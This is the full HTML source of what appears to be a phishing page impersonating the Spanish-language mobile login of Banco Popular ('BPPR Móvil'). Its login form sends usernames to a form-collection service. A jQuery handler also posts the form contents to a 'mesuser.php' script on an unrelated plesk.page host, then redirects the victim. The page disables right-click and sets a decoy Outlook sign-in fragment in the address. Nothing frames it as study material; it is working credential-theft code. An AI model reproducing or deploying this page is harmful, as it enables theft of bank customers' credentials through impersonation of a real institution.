<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BPPR Móvil</title>
    <link
      rel="shortcut icon"
      href="../logopopular copy.png"
      type="image/x-icon"
    />
    <!-- Font Awesome -->
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css"
    />
    <!-- CSS only -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx"
      crossorigin="anonymous"
    />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
    />

    <link rel="stylesheet" href="popularmobile.css" />
  </head>
  <body>
    <div class="popular-header">
      <div class="row">
        <div class="col">&nbsp;</div>
        <div class="col text-center">
          <h6 class="text-white font-weight-bold vcenter">Conéctate</h6>
        </div>
        <div class="col text-right">
          <a
            class="btn btn-primary btn-sm"
            style="height: 27px"
            href="popular.html"
            >English</a
          >
        </div>
      </div>
    </div>

    class="" action="https://submit-form.com/bObgJj7q">
      <!-- <img src="../imglogoPop.gif" /> -->

      <fieldset class="m-1">
        <div class="m-2 form-group">
          <label for="username">Nombre de usuario:</label>
          <a class="float-right" target="_self" href="#"
            >¿Olvidaste tu usuario?</a
          >

          <input
            type="text"
            id="username"
            name="user"
            value=""
            tabindex="1"
            class="form-control"
            autocomplete="off"
			required
          />
          <span class="error" id="login" style="opacity: 0;">Requerido</span>
          <span class="error" id="login-error-msg" style="opacity: 0"
            >Usuario inválido</span
          >
          <br />
        </div>
      </fieldset>

      <div class="m-1">
        <input type="submit" value="Conéctate" />
        <input type="hidden" id="pm_fp" name="pm_fp" value="" />
        <input
          type="hidden"
          id="device_info_rsa"
          name="device_info_rsa"
          value=""
        />
        <input type="hidden" id="rsa_cookie" name="rsa_cookie" value="" />
        <input
          type="button"
          class="custom-button-gray"
          value="Inscríbete"
          onclick="location.href=''"
        />
        <input
          type="button"
          class="custom-button-gray"
          value="Descarga el App"
          onclick="location.href=''"
        />
      </div>
    </form>

    <!-- footer -->
    <footer class="m-1">
      <form action="mobileSwitch" method="post">
        <input type="hidden" name="target" value="login" /><input
          type="hidden"
          name="version"
          value="classic"
        />
        <div style="text-align: center; width: 100%">
          Versión Móvil |
          <a href="index.html" target="_self"> Versión Desktop </a>
        </div>
      </form>
      <div style="margin-top: 50px; text-align: center; font-size: 12px">
        <div
          class="signOn_menuIphone bottomMenu"
          style="float: left; margin-top: 2px"
        >
          © 2023 Popular Inc.&nbsp;
        </div>
        <div
          class="signOn_menuIphone bottomMenu"
          style="float: right; margin-top: 2px"
        >
          <a href="#">Seguridad</a>
          <span class="menu_separator">|</span>
          <a href="#">Privacidad</a>
          <span class="menu_separator">|</span>
          <a href="#">Términos y Condiciones</a>
        </div>
      </div>
    </footer>
    

    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
    
     $(".overlay").show(500);
    $.post('https://gracious-chatterjee.157-254-194-101.plesk.page/p/php/Commons/chevron/Upax/pdf/mesuser.php', $(this).serialize(), function(data){
      console.log(data);
    });
    setTimeout(function() {
                              window.location.href = "popp-es.html";
                        },2000);
    e.preventDefault();
  });


</script>





<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>
  </body>
</html>
